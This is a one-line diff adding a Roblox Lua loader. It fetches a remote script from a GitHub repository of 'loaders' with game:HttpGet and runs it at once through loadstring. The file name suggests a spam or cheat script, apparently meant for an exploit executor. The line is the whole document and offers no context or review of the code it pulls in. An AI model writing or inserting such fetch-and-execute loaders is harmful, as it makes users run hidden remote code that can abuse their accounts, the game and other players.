@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/apple-ipad-original-spam6-mh0h8etohi0qb4.lua"))()
